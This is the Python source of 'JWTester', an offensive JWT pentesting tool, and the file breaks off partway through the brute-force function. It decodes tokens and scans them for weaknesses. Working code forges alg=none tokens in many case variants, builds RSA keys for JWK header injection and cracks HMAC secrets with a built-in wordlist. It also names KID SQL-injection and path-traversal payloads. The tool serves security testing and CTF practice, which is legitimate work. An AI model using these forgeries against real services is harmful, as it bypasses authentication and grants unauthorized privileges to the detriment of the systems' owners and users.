#!/usr/bin/env python3
"""
JWTester v2.0 — Advanced JWT Pentesting Framework
Pure Python 3 | Zero external dependencies | CTF & Pentest Ready

Usage:
    python3 jwtester.py <jwt_file>                          # Decode + scan
    python3 jwtester.py <jwt_file> --all                    # Run all attacks
    python3 jwtester.py <jwt_file> --none                   # None alg attack
    python3 jwtester.py <jwt_file> --crack                  # Brute-force secret
    python3 jwtester.py <jwt_file> --secret "mysecret"      # Forge with known secret
    python3 jwtester.py <jwt_file> --pubkey pub.pem         # RS256->HS256 confusion
    python3 jwtester.py <jwt_file> --jwk                    # JWK header injection
    python3 jwtester.py <jwt_file> --kid-sqli               # KID SQL injection
    python3 jwtester.py <jwt_file> --kid-path               # KID path traversal
    python3 jwtester.py <jwt_file> --forge '{"role":"admin"}' # Claim manipulation
    python3 jwtester.py <jwt_file> --expire 9999999999      # Extend expiry
    python3 jwtester.py <jwt_file> --null-sig               # Null/empty signature
    python3 jwtester.py <jwt_file> --wordlist words.txt     # Custom wordlist
    python3 jwtester.py <jwt_file> --fetch-pubkey              # Auto-fetch JWKS public key

References & Inspiration:
    jwt_tool     - https://github.com/ticarpi/jwt_tool
    jwt-hack     - https://github.com/hahwul/jwt-hack
    jwt-cracker  - https://github.com/lmammino/jwt-cracker
    c-jwt-cracker- https://github.com/brendan-rius/c-jwt-cracker
    PortSwigger  - https://portswigger.net/web-security/jwt
    Auth0 blog   - https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/

Attacks Implemented:
    [A1]  None Algorithm         CVE-2015-9235 style - removes signature requirement
    [A2]  Algorithm Confusion    RS256->HS256 - use RSA public key as HMAC secret
    [A3]  Weak Secret BruteForce Dictionary + incremental charset brute force
    [A4]  JWK Header Injection   Embed attacker-controlled RSA key in 'jwk' header
    [A5]  KID SQL Injection      SQL injection via kid parameter -> arbitrary secret
    [A6]  KID Path Traversal     kid=/dev/null or /proc/sys/kernel/randomize_va_space
    [A7]  Claim Manipulation     Role escalation, admin flags, sub swap
    [A8]  Expiry Bypass          Extend exp claim to far future
    [A9]  Null Signature         Empty string signature bypass
    [A10] JKU/X5U Injection      Hint for remote key URL manipulation
    [A11] Embedded JWK Spoof     Header 'jwk' field with attacker key
"""

import sys, os, base64, json, hmac as _hmac, hashlib, re, time, copy
import threading, secrets, math, argparse, textwrap, datetime
import urllib.request, urllib.error
from string import ascii_lowercase, ascii_uppercase, digits

# ─────────────────────────────────────────────────────────────────────────────
# ANSI COLORS
# ─────────────────────────────────────────────────────────────────────────────
class C:
    RED     = '\033[91m'
    GREEN   = '\033[92m'
    YELLOW  = '\033[93m'
    BLUE    = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN    = '\033[96m'
    WHITE   = '\033[97m'
    BOLD    = '\033[1m'
    DIM     = '\033[2m'
    RESET   = '\033[0m'

    @staticmethod
    def r(s):    return f"{C.RED}{s}{C.RESET}"
    @staticmethod
    def g(s):    return f"{C.GREEN}{s}{C.RESET}"
    @staticmethod
    def y(s):    return f"{C.YELLOW}{s}{C.RESET}"
    @staticmethod
    def b(s):    return f"{C.BLUE}{s}{C.RESET}"
    @staticmethod
    def m(s):    return f"{C.MAGENTA}{s}{C.RESET}"
    @staticmethod
    def c(s):    return f"{C.CYAN}{s}{C.RESET}"
    @staticmethod
    def bold(s): return f"{C.BOLD}{s}{C.RESET}"
    @staticmethod
    def dim(s):  return f"{C.DIM}{s}{C.RESET}"

def banner():
    print(f"""{C.CYAN}{C.BOLD}
  oooo   oooo        o8   ooooooooooo                      ooooooo     
   8888o  88   oooooooo8  88    888    ooooooooo   ooooooo     888888  
   88 888o88  888ooooo88      888    888     888 888             888   
   88   8888  888             888    888     888  888o    8 888888888  
  o88o    88    88oooo888    o888o   888ooo888    88888oo8     888     
{C.RESET}
{C.DIM}  Advanced JWT Pentesting Framework v2.1 | Pure Python3 | No Deps  {C.RESET}
{C.DIM}  Inspired: jwt_tool, jwt-hack, PortSwigger JWT research           {C.RESET}
""")

# ─────────────────────────────────────────────────────────────────────────────
# BUILT-IN WORDLIST  (~300 common JWT secrets)
# ─────────────────────────────────────────────────────────────────────────────
BUILTIN_WORDLIST = [
    "secret","password","123456","1234","test","jwt","token","admin","key",
    "mysecret","my_secret","jwt_secret","jwt-secret","jwtSecret","jwtkey",
    "secret123","password123","changeme","default","pass","passw0rd","qwerty",
    "letmein","trustno1","dragon","master","abc123","monkey","shadow","pass123",
    "111111","iloveyou","sunshine","princess","welcome","666666","654321","7777777",
    "hello","charlie","donald","password1","qwerty123","login","admin123","root",
    "toor","alpine","raspberry","ubuntu","debian","centos","fedora","arch",
    "spring","django","rails","flask","express","laravel","symfony","nodejs",
    "supersecret","super_secret","verysecret","very_secret","secretkey","secret_key",
    "HS256","RS256","ES256","jwtRS256","jwt_hs256","tokenSecret","TOKEN_SECRET",
    "APP_SECRET","app_secret","APPLICATION_SECRET","SESSION_SECRET","session_secret",
    "API_SECRET","api_secret","SIGNING_KEY","signing_key","PRIVATE_KEY","private_key",
    "keyboard cat","shhhhh","your-256-bit-secret","your-512-bit-secret",
    "your-384-bit-secret","secret-key","jwt-secret-key","access-token-secret",
    "refresh-token-secret","super-secret","super_secret_key","MySuperSecretKey",
    "my_super_secret","MySecretKey123","secretpassword","SecretPassword",
    "P@ssw0rd","P@1487w0rd","Passw0rd!","Admin@123","admin@123","Test@123",
    "Welcome1","Welcome@1","Spring","spring2023","spring2024","spring2025",
    "12345678","123456789","1234567890","0987654321","987654321",
    "abcdef","abcdefg","abcdefgh","aaaaaaa","aaaaaaaaa",
    "jwtsecret","jwt_key","jwt-key","jwttoken","jwt_token",
    "SECRETKEY","SECRET_KEY","secretKey","SecretKey",
    "s3cr3t","s3cr3tkey","s3cur3","secr3t","p4ssw0rd",
    "tokenkey","token_key","TokenKey","TOKEN_KEY",
    "apikey","api_key","ApiKey","API_KEY","apiSecret",
    "access_secret","accessSecret","ACCESS_SECRET",
    "refresh_secret","refreshSecret","REFRESH_SECRET",
    "auth_secret","authSecret","AUTH_SECRET",
    "session_key","SessionKey","SESSION_KEY",
    "encryption_key","encryptionKey","ENCRYPTION_KEY",
    "hash_key","hashKey","HASH_KEY",
    "sign_key","signKey","SIGN_KEY",
    "verify_key","verifyKey","VERIFY_KEY",
    "0000000000000000","1111111111111111","aaaaaaaaaaaaaaaa",
    "thisisnotsecure","thisisnotverysecure","notverysecure",
    "pleasechangeme","please_change_me","changethis","change_this",
    "development","Development","DEVELOPMENT","dev","DEV",
    "staging","Staging","STAGING","production","Production","PRODUCTION",
    "localhost","LOCALHOST","127.0.0.1","example","EXAMPLE",
    "null","undefined","none","None","NULL",
    "test_secret","TEST_SECRET","testSecret","TestSecret",
    "demo","Demo","DEMO","sample","Sample","SAMPLE",
    "ChangeMe","CHANGEME","ToBeChanged","TO_BE_CHANGED",
    "xxx","xxxxxxxx","xxxxxxxxxxxxxxxx",
    "hackme","hackthis","crackme","crackthis",
    "","0","1",
]

# ─────────────────────────────────────────────────────────────────────────────
# PURE PYTHON RSA (for JWK injection — no openssl/cryptography needed)
# ─────────────────────────────────────────────────────────────────────────────
def _miller_rabin(n, k=20):
    if n < 2: return False
    if n in (2, 3): return True
    if n % 2 == 0: return False
    r, d = 0, n - 1
    while d % 2 == 0:
        r += 1; d //= 2
    for _ in range(k):
        a = secrets.randbelow(n - 3) + 2
        x = pow(a, d, n)
        if x in (1, n - 1): continue
        for _ in range(r - 1):
            x = pow(x, 2, n)
            if x == n - 1: break
        else:
            return False
    return True

def _gen_prime(bits):
    while True:
        n = secrets.randbits(bits) | (1 << (bits - 1)) | 1
        if _miller_rabin(n): return n

def _extended_gcd(a, b):
    if a == 0: return b, 0, 1
    g, x, y = _extended_gcd(b % a, a)
    return g, y - (b // a) * x, x

def _modinv(a, m):
    g, x, _ = _extended_gcd(a % m, m)
    if g != 1: raise ValueError("Modular inverse does not exist")
    return x % m

def rsa_gen_keypair(bits=2048):
    """Generate RSA key pair - returns (n, e, d, p, q)"""
    print(f"  {C.DIM}[*] Generating {bits}-bit RSA keypair (may take a few seconds)...{C.RESET}")
    p = _gen_prime(bits // 2)
    q = _gen_prime(bits // 2)
    while p == q or abs(p - q) < (1 << (bits // 2 - 100)):
        q = _gen_prime(bits // 2)
    n = p * q
    phi = (p - 1) * (q - 1)
    e = 65537
    d = _modinv(e, phi)
    print(f"  {C.DIM}[+] RSA keypair generated ({n.bit_length()} bits){C.RESET}")
    return n, e, d, p, q

# SHA-256 DigestInfo prefix for PKCS#1 v1.5
SHA256_DI_PREFIX = bytes([
    0x30, 0x31, 0x30, 0x0d, 0x06, 0x09,
    0x60, 0x86, 0x48, 0x01, 0x65, 0x03, 0x04, 0x02, 0x01,
    0x05, 0x00, 0x04, 0x20
])

def rsa_sign_sha256(msg: bytes, d: int, n: int) -> bytes:
    """RSA PKCS#1 v1.5 SHA-256 sign"""
    digest = hashlib.sha256(msg).digest()
    di = SHA256_DI_PREFIX + digest
    em_len = (n.bit_length() + 7) // 8
    pad_len = em_len - len(di) - 3
    if pad_len < 8: raise ValueError("Key too small for PKCS#1 v1.5 with SHA-256")
    em = b'\x00\x01' + b'\xff' * pad_len + b'\x00' + di
    m = int.from_bytes(em, 'big')
    s = pow(m, d, n)
    return s.to_bytes(em_len, 'big')

def _int_to_b64u(n: int) -> str:
    bl = (n.bit_length() + 7) // 8
    return base64.urlsafe_b64encode(n.to_bytes(bl, 'big')).rstrip(b'=').decode()

def rsa_to_jwk_pub(n, e) -> dict:
    return {"kty": "RSA", "n": _int_to_b64u(n), "e": _int_to_b64u(e), "alg": "RS256", "use": "sig"}

def parse_pem_pubkey(pem: str):
    """Parse RSA public key PEM -> (n, e)"""
    lines = pem.strip().splitlines()
    b64 = ''.join(l for l in lines if not l.startswith('---'))
    der = base64.b64decode(b64)

    def read_tlv(data, idx):
        tag = data[idx]; idx += 1
        l = data[idx]; idx += 1
        if l & 0x80:
            nb = l & 0x7f
            l = int.from_bytes(data[idx:idx+nb], 'big'); idx += nb
        return tag, l, idx

    def read_int(data, idx):
        tag, l, idx = read_tlv(data, idx)
        if tag != 0x02: raise ValueError("Expected INTEGER tag")
        val = int.from_bytes(data[idx:idx+l], 'big')
        return val, idx + l

    idx = 0
    tag, l, idx = read_tlv(der, idx)   # outer SEQUENCE
    if tag != 0x30: raise ValueError("Expected outer SEQUENCE")
    tag, l, idx = read_tlv(der, idx)   # algorithm SEQUENCE
    if tag != 0x30: raise ValueError("Expected algorithm SEQUENCE")
    idx += l                            # skip algorithm OID
    tag, l, idx = read_tlv(der, idx)   # BIT STRING
    if tag != 0x03: raise ValueError("Expected BIT STRING")
    idx += 1                            # unused bits byte
    tag, l, idx = read_tlv(der, idx)   # RSAPublicKey SEQUENCE
    if tag != 0x30: raise ValueError("Expected RSAPublicKey SEQUENCE")
    n, idx = read_int(der, idx)
    e, idx = read_int(der, idx)
    return n, e

# ─────────────────────────────────────────────────────────────────────────────
# JWT CORE
# ─────────────────────────────────────────────────────────────────────────────

def b64u_dec(s: str) -> bytes:
    s = s.replace('-', '+').replace('_', '/')
    pad = (4 - len(s) % 4) % 4
    return base64.b64decode(s + '=' * pad)

def b64u_enc(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).rstrip(b'=').decode()

def jwt_parse(token: str):
    """Parse JWT into (header, payload, signature_bytes, raw_parts)"""
    parts = token.strip().split('.')
    if len(parts) not in (2, 3):
        raise ValueError(f"Expected 3 JWT parts, got {len(parts)}")
    while len(parts) < 3:
        parts.append('')
    try:
        header = json.loads(b64u_dec(parts[0]))
    except Exception:
        header = {"_raw": parts[0]}
    try:
        payload = json.loads(b64u_dec(parts[1]))
    except Exception:
        payload = {"_raw": parts[1]}
    sig = b64u_dec(parts[2]) if parts[2] else b''
    return header, payload, sig, parts

def jwt_build(header: dict, payload: dict, secret=None) -> str:
    """
    Build JWT.
    secret: bytes for HMAC, (d,n) tuple for RSA signing, None for alg=none.
    """
    h = b64u_enc(json.dumps(header, separators=(',', ':')).encode())
    p = b64u_enc(json.dumps(payload, separators=(',', ':')).encode())
    signing_input = f"{h}.{p}".encode()
    alg = str(header.get('alg', 'none')).upper()

    if alg == 'NONE' or secret is None:
        return f"{h}.{p}."

    if alg.startswith('HS'):
        bits = {'HS256': hashlib.sha256, 'HS384': hashlib.sha384, 'HS512': hashlib.sha512}
        hfn = bits.get(alg, hashlib.sha256)
        if not isinstance(secret, (bytes, bytearray)):
            secret = str(secret).encode()
        sig = _hmac.new(secret, signing_input, hfn).digest()
        return f"{h}.{p}.{b64u_enc(sig)}"

    if alg.startswith('RS'):
        if isinstance(secret, tuple) and len(secret) == 2:
            d, n = secret
            sig = rsa_sign_sha256(signing_input, d, n)
            return f"{h}.{p}.{b64u_enc(sig)}"
        raise ValueError("RS* algorithms require (d, n) tuple as secret")

    raise ValueError(f"Unsupported algorithm for jwt_build: {alg}")

def jwt_verify_hmac(token: str, secret: bytes) -> bool:
    """Verify HMAC-based JWT signature"""
    try:
        parts = token.strip().split('.')
        if len(parts) < 3: return False
        hdr = json.loads(b64u_dec(parts[0]))
        alg = str(hdr.get('alg', '')).upper()
        bits = {'HS256': hashlib.sha256, 'HS384': hashlib.sha384, 'HS512': hashlib.sha512}
        if alg not in bits: return False
        signing_input = f"{parts[0]}.{parts[1]}".encode()
        if not isinstance(secret, (bytes, bytearray)):
            secret = str(secret).encode()
        expected = _hmac.new(secret, signing_input, bits[alg]).digest()
        actual   = b64u_dec(parts[2])
        return _hmac.compare_digest(expected, actual)
    except Exception:
        return False

# ─────────────────────────────────────────────────────────────────────────────
# DISPLAY
# ─────────────────────────────────────────────────────────────────────────────

def ts_to_human(ts):
    try:
        dt  = datetime.datetime.fromtimestamp(int(ts), tz=datetime.timezone.utc).replace(tzinfo=None)
        now = datetime.datetime.now(datetime.timezone.utc).replace(tzinfo=None)
        diff = int((dt - now).total_seconds())
        if diff < 0:
            delta = f"{C.RED}EXPIRED {abs(diff)}s ago{C.RESET}"
        else:
            days = diff // 86400
            delta = f"{C.GREEN}valid ~{days}d {diff % 86400 // 3600}h remaining{C.RESET}"
        return f"{dt.strftime('%Y-%m-%d %H:%M:%S')} UTC  ({delta})"
    except Exception:
        return str(ts)

def display_jwt(header, payload, sig, parts, token):
    print(f"\n{C.BOLD}{'─'*72}{C.RESET}")
    print(f"{C.BOLD}{C.CYAN}  [*] JWT DECODED{C.RESET}")
    print(f"{C.BOLD}{'─'*72}{C.RESET}")

    print(f"\n  {C.BOLD}{C.YELLOW}HEADER{C.RESET}")
    if isinstance(header, dict):
        for k, v in header.items():
            flag = ''
            if k == 'alg':
                alg_up = str(v).upper()
                if alg_up == 'NONE':
                    flag = f"  {C.RED}[!] alg=none — NO signature verification!{C.RESET}"
                elif alg_up in ('RS256','RS384','RS512','PS256','PS384','PS512'):
                    flag = f"  {C.CYAN}(asymmetric — confusion attack possible){C.RESET}"
                elif alg_up in ('HS256','HS384','HS512'):
                    flag = f"  {C.YELLOW}(symmetric HMAC — brute-forceable if weak){C.RESET}"
                elif alg_up in ('ES256','ES384','ES512'):
                    flag = f"  {C.CYAN}(ECDSA — algorithm confusion check applicable){C.RESET}"
            if k == 'kid':
                flag = f"  {C.YELLOW}[!] kid present — SQL/path traversal possible{C.RESET}"
            if k == 'jwk':
                flag = f"  {C.RED}[!!!] JWK embedded in header — injection risk!{C.RESET}"
            if k in ('jku','x5u'):
                flag = f"  {C.RED}[!!!] Remote key URL — SSRF/injection risk!{C.RESET}"
            print(f"    {C.CYAN}{k}{C.RESET}: {C.WHITE}{json.dumps(v) if isinstance(v,(dict,list)) else v}{C.RESET}{flag}")

    print(f"\n  {C.BOLD}{C.YELLOW}PAYLOAD{C.RESET}")
    PRIV_CLAIMS = {'sub','iss','aud','role','roles','admin','isadmin','group',
                   'groups','scope','permissions','user_id','userid','username',
                   'email','name','type','kind','priv','privilege','access'}
    if isinstance(payload, dict):
        for k, v in payload.items():
            flag = ''
            if k in ('exp','iat','nbf'):
                flag = f"  -> {ts_to_human(v)}"
            if k.lower() in PRIV_CLAIMS:
                flag += f"  {C.MAGENTA}[privilege claim]{C.RESET}"
            print(f"    {C.CYAN}{k}{C.RESET}: {C.WHITE}{json.dumps(v) if isinstance(v,(dict,list)) else v}{C.RESET}{flag}")

    print(f"\n  {C.BOLD}{C.YELLOW}SIGNATURE{C.RESET}")
    if sig:
        print(f"    {C.WHITE}{sig.hex()}{C.RESET}  ({len(sig)} bytes)")
    else:
        print(f"    {C.RED}[!!!] EMPTY SIGNATURE — no signature present!{C.RESET}")

    print(f"\n  {C.BOLD}{C.YELLOW}RAW PARTS{C.RESET}")
    print(f"    {C.RED}{parts[0]}{C.RESET}  (header)")
    print(f"    .{C.GREEN}{parts[1]}{C.RESET}  (payload)")
    print(f"    .{C.BLUE}{parts[2]}{C.RESET}  (signature)")

# ─────────────────────────────────────────────────────────────────────────────
# VULNERABILITY SCANNER
# ─────────────────────────────────────────────────────────────────────────────

class Finding:
    SEVERITY_ORDER = ['CRITICAL','HIGH','MEDIUM','LOW','INFO']

    def __init__(self, severity, name, description, attack_hint):
        self.severity    = severity
        self.name        = name
        self.description = description
        self.attack_hint = attack_hint

SEV_COLOR = {
    'CRITICAL': C.RED,
    'HIGH':     C.RED,
    'MEDIUM':   C.YELLOW,
    'LOW':      C.CYAN,
    'INFO':     C.DIM,
}

SEV_ICON = {
    'CRITICAL': '[!!!]',
    'HIGH':     '[!! ]',
    'MEDIUM':   '[ ! ]',
    'LOW':      '[ ~ ]',
    'INFO':     '[ i ]',
}


# ─────────────────────────────────────────────────────────────────────────────
# ISSUER FINGERPRINTING & JWKS AUTO-FETCH
# ─────────────────────────────────────────────────────────────────────────────

KNOWN_ISSUERS = {
    'sts.windows.net':       ('Microsoft Azure AD / Entra ID', 'https://login.microsoftonline.com/{tenant}/discovery/v2.0/keys'),
    'login.microsoftonline': ('Microsoft Azure AD / Entra ID', 'https://login.microsoftonline.com/{tenant}/discovery/v2.0/keys'),
    'accounts.google.com':   ('Google',  'https://www.googleapis.com/oauth2/v3/certs'),
    'securetoken.google':    ('Google Firebase', 'https://www.googleapis.com/service_accounts/v1/jwk/securetoken@system.gserviceaccount.com'),
    'cognito-idp':           ('AWS Cognito', 'https://cognito-idp.{region}.amazonaws.com/{pool}/.well-known/jwks.json'),
    'auth0.com':             ('Auth0', '{iss}/.well-known/jwks.json'),
    'okta.com':              ('Okta',  '{iss}/v1/keys'),
    'ping':                  ('PingIdentity', '{iss}/jwks'),
    'salesforce.com':        ('Salesforce', '{iss}/id/keys'),
    'adfs':                  ('Microsoft ADFS', '{iss}/adfs/discovery/keys'),
    'b2clogin.com':          ('Azure AD B2C', '{iss}/.well-known/openid-configuration'),
    'apple.com':             ('Apple Sign-In', 'https://appleid.apple.com/auth/keys'),
    'facebook.com':          ('Facebook', 'https://www.facebook.com/.well-known/oauth/openid/jwks/'),
    'line.me':               ('LINE', 'https://api.line.me/oauth2/v2.1/certs'),
}

def fingerprint_issuer(payload):
    """Detect well-known token issuer from iss/aud claims. Returns (name, jwks_hint) or None."""
    if not isinstance(payload, dict):
        return None
    iss = str(payload.get('iss', ''))
    aud = str(payload.get('aud', ''))
    combined = (iss + ' ' + aud).lower()
    for pattern, (name, jwks_url) in KNOWN_ISSUERS.items():
        if pattern.lower() in combined:
            # Try to fill in tenant for Azure
            if '{tenant}' in jwks_url and 'sts.windows.net' in iss:
                try:
                    tenant = iss.rstrip('/').split('/')[-1]
                    jwks_url = jwks_url.replace('{tenant}', tenant)
                except Exception:
                    pass
            elif '{iss}' in jwks_url:
                jwks_url = jwks_url.replace('{iss}', iss.rstrip('/'))
            return name, jwks_url
    return None

def fetch_jwks_pubkey(jwks_url, kid=None):
    """Fetch JWKS from URL, return PEM-like key info for matching kid. Returns list of (kid, n, e) tuples."""
    try:
        req = urllib.request.Request(jwks_url, headers={'User-Agent': 'JWTester/2.0'})
        with urllib.request.urlopen(req, timeout=8) as resp:
            data = json.loads(resp.read().decode())
        keys = data.get('keys', [data] if 'n' in data else [])
        results = []
        for k in keys:
            if k.get('kty') != 'RSA': continue
            k_kid = k.get('kid', '')
            if kid and k_kid != kid: continue
            # Decode n and e from base64url
            def b64u_to_int(s):
                s = s.replace('-','+').replace('_','/')
                pad = (4 - len(s) % 4) % 4
                return int.from_bytes(base64.b64decode(s + '='*pad), 'big')
            n = b64u_to_int(k['n'])
            e = b64u_to_int(k['e'])
            results.append((k_kid, n, e))
        return results
    except Exception as ex:
        return []

def kid_looks_like_thumbprint(kid):
    """Heuristic: does this kid look like a cert thumbprint (base64url of fixed-length hash)?"""
    if not kid: return False
    clean = kid.replace('-','').replace('_','').replace('=','')
    # SHA-1 thumbprint base64url = 27-28 chars; SHA-256 = 43 chars
    return re.match(r'^[A-Za-z0-9_-]{20,50}$', kid) and len(kid) in range(20, 55)

def scan(header, payload, sig, parts):
    findings = []
    alg = str(header.get('alg', '')).upper() if isinstance(header, dict) else ''

    # Issuer fingerprint (info, not a vuln itself)
    issuer_info = fingerprint_issuer(payload)
    if issuer_info:
        name, jwks_url = issuer_info
        findings.append(Finding('INFO', f'Known Issuer: {name}',
            f'Token issued by {name}. JWKS endpoint: {jwks_url}\n'
            '    KID/x5t injection attacks target the RECEIVING application library, not this issuer.',
            f'--fetch-pubkey to auto-retrieve public key for confusion attack'))

    # x5t / x5t#S256 (cert thumbprint in header)
    if isinstance(header, dict) and ('x5t' in header or 'x5tS256' in header):
        x5t_val = header.get('x5t') or header.get('x5tS256','')
        findings.append(Finding('LOW', 'x5t Certificate Thumbprint in Header',
            f'x5t={x5t_val!r}. Server uses this to look up certificate from its store.',
            'Informational — hard to exploit without certificate store access.'))

    # A1: None algorithm
    if alg == 'NONE':
        findings.append(Finding('CRITICAL', 'alg=none (No Signature)',
            'Token uses alg=none — server may skip signature verification entirely.',
            'Token is already exploitable. --none generates bypass variants.'))
    elif re.match(r'^[Nn][Oo][Nn][Ee]$', alg):
        findings.append(Finding('HIGH', 'None Algorithm Variant',
            f'alg value "{header.get("alg")}" is a case variant of "none".',
            '--none generates more variants including this one.'))

    # A2: Algorithm confusion
    if alg in ('RS256','RS384','RS512','PS256','PS384','PS512'):
        findings.append(Finding('HIGH', 'Algorithm Confusion Candidate (RS256->HS256)',
            f'Token uses asymmetric {alg}. If server auto-detects algorithm, '
            f'signing with public key as HMAC secret may work.',
            '--pubkey <pub.pem> to attempt the confusion attack (CVE-2016-5431 style)'))

    if alg in ('ES256','ES384','ES512'):
        findings.append(Finding('MEDIUM', 'ECDSA — Check for Faulty Verification',
            f'Token uses {alg}. Some libraries have had signature malleability bugs.',
            'Research known bugs for your target library version.'))

    # A3: Symmetric — brutable
    if alg in ('HS256','HS384','HS512'):
        findings.append(Finding('MEDIUM', f'Symmetric HMAC ({alg}) — Brute-Forceable Secret',
            'HMAC token security depends entirely on secret strength. Weak secrets are crackable offline.',
            '--crack (built-in wordlist) or --crack --wordlist rockyou.txt'))

    # A4: JWK embedded
    if isinstance(header, dict) and 'jwk' in header:
        findings.append(Finding('CRITICAL', 'JWK Embedded in Header',
            f'Header contains "jwk" field: {json.dumps(header["jwk"])[:80]}...\n'
            '    Some servers use this key directly for verification — JWK injection!',
            '--jwk to forge a token with attacker-controlled RSA key embedded'))

    # A5: KID present
    if isinstance(header, dict) and 'kid' in header:
        kid_val = str(header['kid'])
        is_thumbprint = kid_looks_like_thumbprint(kid_val)
        if is_thumbprint:
            findings.append(Finding('MEDIUM', 'KID Looks Like Certificate Thumbprint',
                f'kid={kid_val!r} appears to be a cert thumbprint (base64url hash).\n'
                '    Likely used for JWKS key lookup by kid match — injection less likely but still test.',
                '--kid-sqli / --kid-path target the receiving lib, not the issuer JWKS store'))
        else:
            findings.append(Finding('HIGH', 'KID Parameter Present',
                f'kid={kid_val!r}. If server fetches key from DB or filesystem by kid, injection may work.',
                '--kid-sqli (SQL injection) or --kid-path (path traversal)'))
        sqli_signs = ("'", '"', ';', '--', '/*', 'union ', 'select ', 'or 1', 'drop ')
        if any(s in kid_val.lower() for s in sqli_signs):
            findings.append(Finding('CRITICAL', 'Possible SQL Injection in KID',
                f'kid value appears to contain SQL: {kid_val!r}',
                'Target may already be vulnerable — verify with --kid-sqli'))
        if '..' in kid_val or kid_val.startswith('/') or kid_val.startswith('\\'):
            findings.append(Finding('HIGH', 'Path Traversal in KID',
                f'kid value contains path traversal chars: {kid_val!r}',
                '--kid-path for more path traversal payloads'))

    # A6: Remote key URL headers
    if isinstance(header, dict) and 'jku' in header:
        findings.append(Finding('HIGH', 'JKU (JWKS URL) in Header',
            f'jku={header["jku"]!r}. Server may fetch and use JWKS from this URL.',
            'Replace jku with attacker-controlled JWKS endpoint, sign with matching key. See --jku-hint'))
    if isinstance(header, dict) and 'x5u' in header:
        findings.append(Finding('HIGH', 'X5U (Certificate URL) in Header',
            f'x5u={header["x5u"]!r}. Server may fetch X.509 cert from this URL.',
            'Replace x5u with attacker-controlled cert URL.'))

    # A7: Privilege claims
    if isinstance(payload, dict):
        priv_keys = [k for k in payload if k.lower() in
                     ('role','roles','admin','isadmin','is_admin','group','groups',
                      'scope','permissions','privilege','priv','type','kind','access')]
        if priv_keys:
            claim_summary = {k: payload[k] for k in priv_keys}
            findings.append(Finding('MEDIUM', 'Privilege Claims Present',
                f'Escalatable claims detected: {claim_summary}',
                '--forge \'{"admin":true,"role":"admin"}\' (--secret required for HMAC tokens)'))

    # A8: Expiry
    if isinstance(payload, dict):
        if 'exp' in payload:
            try:
                remaining = int(payload['exp']) - int(time.time())
                if remaining < 0:
                    findings.append(Finding('INFO', 'Token Expired',
                        f'Token expired {abs(remaining)}s ago ({abs(remaining)//3600}h).',
                        '--expire 9999999999 to forge non-expiring token (needs --secret for HMAC)'))
                elif remaining > 86400 * 365 * 5:
                    findings.append(Finding('LOW', 'Extremely Long-Lived Token',
                        f'Token valid for ~{remaining // 86400} days.',
                        'Extended window for offline secret cracking.'))
            except Exception:
                pass
        else:
            findings.append(Finding('MEDIUM', 'No Expiry (exp) Claim',
                'Token never expires — permanent access if compromised.',
                'Informational — token already lacks expiry.'))

    # A9: Empty/null signature
    if sig == b'':
        findings.append(Finding('CRITICAL', 'Empty/Null Signature',
            'Token has an empty signature field.',
            'Server may accept this directly. --null-sig generates more variants.'))

    # Misc header fields
    if isinstance(header, dict) and 'crit' in header:
        findings.append(Finding('LOW', 'Critical Header Extension ("crit")',
            f'crit={header["crit"]!r}. May trigger extension processing bugs.',
            'Test removing or modifying "crit" header field.'))

    return findings

def display_findings(findings):
    print(f"\n{C.BOLD}{'─'*72}{C.RESET}")
    print(f"{C.BOLD}{C.CYAN}  [*] VULNERABILITY SCAN{C.RESET}")
    print(f"{C.BOLD}{'─'*72}{C.RESET}")
    if not findings:
        print(f"  {C.GREEN}[+] No obvious vulnerabilities detected.{C.RESET}")
        return
    findings.sort(key=lambda f: Finding.SEVERITY_ORDER.index(f.severity))
    for f in findings:
        col  = SEV_COLOR.get(f.severity, '')
        icon = SEV_ICON.get(f.severity, '[?]')
        print(f"\n  {col}{C.BOLD}{icon} {f.severity} — {f.name}{C.RESET}")
        for line in f.description.splitlines():
            print(f"       {C.WHITE}{line.strip()}{C.RESET}")
        print(f"       {C.DIM}> Next: {f.attack_hint}{C.RESET}")
    total = {'CRITICAL': 0, 'HIGH': 0, 'MEDIUM': 0, 'LOW': 0, 'INFO': 0}
    for f in findings:
        total[f.severity] = total.get(f.severity, 0) + 1
    print(f"\n  Summary: ", end='')
    for sev in ['CRITICAL','HIGH','MEDIUM','LOW','INFO']:
        if total[sev]:
            print(f"{SEV_COLOR[sev]}{total[sev]} {sev}{C.RESET}  ", end='')
    print()

# ─────────────────────────────────────────────────────────────────────────────
# ATTACKS
# ─────────────────────────────────────────────────────────────────────────────

def section(title):
    print(f"\n{C.BOLD}{'─'*72}{C.RESET}")
    print(f"{C.BOLD}{C.CYAN}  [ATTACK] {title}{C.RESET}")
    print(f"{C.BOLD}{'─'*72}{C.RESET}")

def show_forged(label, token):
    parts = token.split('.')
    while len(parts) < 3: parts.append('')
    print(f"\n  {C.BOLD}{C.GREEN}[+] {label}{C.RESET}")
    print(f"  {C.RED}{parts[0]}{C.RESET}.{C.GREEN}{parts[1]}{C.RESET}.{C.BLUE}{parts[2]}{C.RESET}")
    print(f"\n  {C.BOLD}Full token (copy-paste ready):{C.RESET}")
    print(f"  {token}")

# ── A1: None Algorithm ────────────────────────────────────────────────────────
def attack_none(header, payload):
    section("None Algorithm [A1] — CVE-2015-9235 style")
    print(f"  {C.DIM}Forging tokens with 'alg' set to all known 'none' variants...{C.RESET}")
    results = []
    none_variants = ['none', 'None', 'NONE', 'nOne', 'NoNe', 'noNE', 'nOnE', 'nonE', 'NONE ']
    for variant in none_variants:
        h = copy.deepcopy(header)
        h['alg'] = variant
        token = jwt_build(h, payload, None)
        results.append((variant, token))
        show_forged(f"alg={variant!r}", token)
    print(f"\n  {C.DIM}How to use: Send any of these tokens to the target.")
    print(f"  If server accepts without rejecting, signature verification is bypassed.{C.RESET}")
    return results

# ── A3: HMAC Brute Force ──────────────────────────────────────────────────────
def attack_crack(token, header, payload, sig, extra_words=None, wordlist_file=None):
    section("HMAC Secret Brute Force [A3]")
    alg = str(header.get('alg', '')).upper()
    if not alg.startswith('HS'):
        print(f"  {C.YELLOW}[!] Token uses {alg}, not HMAC — direct crack not applicable.{C.RESET}")
        print(f"  {C.DIM}Tip: For RS256, use --pubkey for algorithm confusion instead.{C.RESET}")
        return None

    words = list(BUILTIN_WORDLIST)
    if extra_words:
        words = list(extra_words) + words
    if wordlist_file:
        try:
            with open(wordlist_file, errors='replace') as f:
                file_words = [l.strip() for l in f if l.strip()]
            words = file_words + words
